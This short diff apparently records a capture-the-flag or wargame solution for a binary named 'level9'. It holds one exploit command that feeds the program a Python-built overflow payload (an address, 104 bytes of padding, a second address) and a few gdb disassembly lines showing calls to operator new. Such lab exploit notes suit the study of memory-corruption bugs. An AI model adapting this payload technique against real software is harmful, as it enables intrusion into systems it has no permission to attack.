@@ -1,0 +1,4 @@
+./level9 $(python -c 'print "\x1c\x88\x04\x08" + "A"*104 + "\x0c\xa0\x04\x08"')
+0x0804881c
+   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
+   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
